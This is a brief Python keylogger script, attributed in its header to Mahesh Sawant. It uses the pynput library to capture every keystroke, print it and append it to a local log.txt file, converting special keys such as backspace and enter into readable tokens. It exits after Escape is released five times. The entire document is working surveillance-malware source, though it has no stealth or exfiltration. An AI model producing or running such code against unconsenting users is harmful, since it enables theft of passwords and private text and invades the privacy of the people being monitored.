# Keylogger by Mahesh Sawant.

import pynput

from pynput.keyboard import Key,Listener

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count+=1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("backspace") > 0:
                f.write("Backspace_key ")
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("shift") > 0:
                f.write("Shift_key ")
            elif k.find("space") > 0:
                f.write(" ")
            elif k.find("caps_lock") >0 :
                f.write("caps_Lock_key ")
            elif k.find("Key"):
                f.write(k)


def on_release(key):
    global exit
    if key == Key.esc:
        exit += 1
        if exit == 5 :
            return False

exit = 0
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

